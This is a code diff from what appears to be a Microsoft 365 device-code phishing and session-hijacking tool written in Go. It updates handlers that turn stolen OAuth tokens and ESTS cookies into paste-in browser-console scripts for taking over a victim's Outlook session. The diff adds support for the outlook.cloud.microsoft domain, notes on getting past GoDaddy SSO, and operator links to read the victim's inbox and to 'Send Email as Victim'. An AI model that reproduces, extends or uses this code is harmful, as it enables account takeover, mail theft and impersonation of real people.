@@ -1147,13 +1147,21 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	clientInfo := base64.RawURLEncoding.EncodeToString(ciRaw)
 
 	// OWA MSAL uses individual scopes, not /.default.
-	// We write cache entries for multiple scope variants so at least one matches
-	// regardless of which MSAL version / scope format OWA is using.
+	// We write cache entries for many scope variants — MSAL sorts scopes alphabetically
+	// when creating cache keys, so the lookup must match exactly.
+	// From the authorize URL: scope=https://outlook.office.com/.default openid profile offline_access
+	// Sorted alphabetically: https://outlook.office.com/.default offline_access openid profile
 	scopeFromToken := jwtStr(claims, "scp") // e.g. "Mail.ReadWrite Calendars.ReadWrite openid profile email offline_access"
 	scopeVariants := []string{
+		// Exact scope from OWA MSAL v4.28.2 authorize request (no email):
+		"https://outlook.office.com/.default openid profile offline_access",
+		// Sorted (MSAL normalizes scope order in cache keys):
+		"https://outlook.office.com/.default offline_access openid profile",
+		// Variants with email (older OWA / device code scope):
 		"https://outlook.office.com/.default openid profile email offline_access",
+		"https://outlook.office.com/.default offline_access openid profile email",
+		"email https://outlook.office.com/.default offline_access openid profile",
 		"openid profile email offline_access https://outlook.office.com/.default",
-		"email https://outlook.office.com/.default offline_access openid profile", // normalized (sorted)
 	}
 	if scopeFromToken != "" {
 		scopeVariants = append(scopeVariants, scopeFromToken)
@@ -1316,10 +1324,9 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	// Clear any stale interaction-in-progress flag that blocks silent auth.
 	entries["msal.interaction.status"] = ""
 
-	// ── Server-side OWA warm-up: hit outlook.office.com with bearer so
-	// Microsoft sets its session cookies in our jar; we pass those to the
-	// inject snippet so the admin's browser is fully authenticated without
-	// needing the broken proxy (no cross-origin, no MetaMask SES, no crypto).
+	// ── Server-side OWA warm-up.
+	// OWA now lives at outlook.cloud.microsoft (2025+); outlook.office.com
+	// redirects there. We warm both origins so cookies are collected for both.
 	type cookieKV struct {
 		Name  string `json:"n"`
 		Value string `json:"v"`
@@ -1340,17 +1347,22 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 				return nil
 			},
 		}
-		// Hit /owa/ first (sets canary + client-id cookies), then /mail/
-		for _, warmPath := range []string{"https://outlook.office.com/owa/", "https://outlook.office.com/mail/"} {
+		for _, warmPath := range []string{
+			"https://outlook.cloud.microsoft/mail/",
+			"https://outlook.office.com/mail/",
+		} {
 			wReq, _ := http.NewRequest("GET", warmPath, nil)
 			wReq.Header.Set("Authorization", "Bearer "+owaAT)
 			wReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
 			wReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 			owaWarmClient.Do(wReq) //nolint
 		}
-		owaURL, _ := url.Parse("https://outlook.office.com")
-		for _, c := range owaJar.Cookies(owaURL) {
-			owaCookieKVs = append(owaCookieKVs, cookieKV{Name: c.Name, Value: c.Value, Path: "/"})
+		// Collect cookies from both OWA origins
+		for _, origin := range []string{"https://outlook.cloud.microsoft", "https://outlook.office.com"} {
+			owaURL, _ := url.Parse(origin)
+			for _, c := range owaJar.Cookies(owaURL) {
+				owaCookieKVs = append(owaCookieKVs, cookieKV{Name: c.Name, Value: c.Value, Path: "/"})
+			}
 		}
 	}
 	owaCookiesJSON, _ := json.Marshal(owaCookieKVs)
@@ -1377,7 +1389,7 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
     try{sessionStorage.setItem(k,v);}catch(e){}
   });
   console.log('%c✓ OWA tokens written — navigating to /mail/','color:#0a0;font-size:14px;font-weight:bold');
-  setTimeout(function(){location.href='https://outlook.office.com/mail/';},300);
+  setTimeout(function(){location.href='https://outlook.cloud.microsoft/mail/';},300);
 })();`)
 
 	snippet := js.String()
@@ -1421,7 +1433,7 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <h2 style="color:#4a9fd4">Steps (read carefully)</h2>
 <ol class="steps">
 <li>Click <strong>Copy Script</strong> first — have it ready in clipboard</li>
-<li>Click <strong>Open OWA Page</strong> — opens <code style="color:#aaa">outlook.office.com/mail/</code> in new tab<br>
+<li>Click <strong>Open OWA Page</strong> — opens <code style="color:#aaa">outlook.cloud.microsoft/mail/</code> in new tab<br>
   <span style="color:#777;font-size:11px">It will redirect to Microsoft login — that is normal and expected</span></li>
 <li>In the new tab: press <strong>F12</strong> → <strong>Console</strong> tab immediately (even if page is loading or on login)</li>
 <li>Paste the script → press <strong>Enter</strong> — you will see <span style="color:#0a0;font-weight:700">✓ OWA tokens written</span> in console, then auto-navigate to /mail/ as <strong>%s</strong></li>
@@ -1436,7 +1448,7 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <textarea class="code" id="ta" readonly>%s</textarea>
 <div class="row">
 <button class="btn" id="cpbtn" onclick="doCopy()">Copy Script</button>
-<a class="btn b2" href="https://outlook.office.com/mail/" target="_blank">Open OWA Page</a>
+<a class="btn b2" href="https://outlook.cloud.microsoft/mail/" target="_blank">Open OWA Page</a>
 <span class="ok" id="ok">Copied!</span>
 </div>
 <p class="note">If copy fails: click inside the text box → Ctrl+A → Ctrl+C → paste in OWA console</p>
@@ -1728,14 +1740,14 @@ func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request)
 	// base64("https://login.microsoftonline.com")
 	msLoginB64 := base64.StdEncoding.EncodeToString([]byte("https://login.microsoftonline.com"))
 
+	// Build script in the exact format the user confirmed works:
+	// Sets cookies with Max-Age + SameSite=None, then navigates to login.microsoft
 	var scriptBuf strings.Builder
 	scriptBuf.WriteString("!function(){\n")
 	scriptBuf.WriteString("  let e=JSON.parse(`")
 	scriptBuf.Write(cookieJSON)
 	scriptBuf.WriteString("`);\n")
-	scriptBuf.WriteString("  for(let o of e){\n")
-	scriptBuf.WriteString("    document.cookie=o.name+'='+o.value+'; domain='+o.domain+'; path='+o.path+'; secure';\n")
-	scriptBuf.WriteString("  }\n")
+	scriptBuf.WriteString("  for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:''}${o.domain?`${o.path?'':'path=/;'}domain=${o.domain};`:''}Secure;SameSite=None`;\n")
 	scriptBuf.WriteString("  window.location.href=atob('")
 	scriptBuf.WriteString(msLoginB64)
 	scriptBuf.WriteString("');\n")
@@ -1756,18 +1768,25 @@ func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request)
 	// statusNote shown at top of page
 	statusNote := ""
 	if !hasESTS {
-		// No ESTSAUTH obtained — redirect user to the OWA inject page which DOES work.
-		statusNote = fmt.Sprintf(`<div style="background:#1a2a0a;border:2px solid #3a7a1a;border-radius:6px;padding:16px 20px;margin-bottom:16px">
-<div style="font-size:14px;font-weight:700;color:#7fcc40;margin-bottom:8px">Use OWA Session Inject instead — it always works</div>
-<p style="font-size:13px;color:#aad480;line-height:1.7;margin-bottom:12px">
-ESTSAUTH was <strong style="color:#fff">not obtained</strong> — Microsoft only sets that cookie during an interactive browser login, never from a server-side token refresh. The console script below cannot set HttpOnly cookies either, so it <strong style="color:#fff">will not log you in</strong>.<br><br>
-<strong style="color:#fff">The reliable method:</strong> use <strong>OWA Session Inject</strong> which writes the MSAL token cache (access + refresh token) directly into the browser localStorage — no cookies needed.
+		statusNote = fmt.Sprintf(`<div style="background:#2a1a0a;border:2px solid #7a4a1a;border-radius:6px;padding:16px 20px;margin-bottom:16px">
+<div style="font-size:14px;font-weight:700;color:#e0a040;margin-bottom:8px">⚠ ESTSAUTH not obtained — DC tokens cannot derive it</div>
+<p style="font-size:13px;color:#cc9955;line-height:1.8;margin-bottom:14px">
+ESTSAUTH is only set by Microsoft during an interactive browser login. Server-side token refresh never yields it.<br><br>
+<strong style="color:#fff">For GoDaddy SSO accounts:</strong> without ESTSAUTH, GoDaddy SSO will ask for a password even if you set these cookies.<br>
+<strong style="color:#fff">The working alternatives are:</strong>
 </p>
-<a href="/dc/inject/%s" style="display:inline-block;padding:10px 24px;background:#107c10;color:#fff;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none">→ Go to OWA Session Inject</a>
-</div>`, template.HTMLEscapeString(landingToken))
+<div style="display:flex;gap:10px;flex-wrap:wrap">
+<a href="/dc/inject/%s" style="display:inline-block;padding:9px 20px;background:#0078d4;color:#fff;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none">→ OWA Session Inject (outlook.cloud.microsoft)</a>
+<a href="/dc/inbox/%s" style="display:inline-block;padding:9px 20px;background:#107c10;color:#fff;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none">→ Read Inbox (Graph API — always works)</a>
+<a href="/dc/send/%s" style="display:inline-block;padding:9px 20px;background:#5c2d91;color:#fff;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none">→ Send Email as Victim</a>
+</div>
+</div>`,
+			template.HTMLEscapeString(landingToken),
+			template.HTMLEscapeString(landingToken),
+			template.HTMLEscapeString(landingToken))
 	} else {
 		statusNote = `<div style="background:#0a1a2a;border:1px solid #1a4a7a;border-radius:4px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:#7ec8e3">
-<strong style="color:#fff">ESTSAUTH obtained</strong> — use <strong>Cookie Editor</strong> (Method A below) to inject. The console script (Method B) CANNOT set HttpOnly cookies and will not work.
+<strong style="color:#fff">✓ ESTSAUTH obtained</strong> — use <strong>Cookie Editor</strong> (Method A) to import. The console script below sets the cookies and navigates to login.microsoft — GoDaddy SSO will auto-complete.
 </div>`
 	}
 
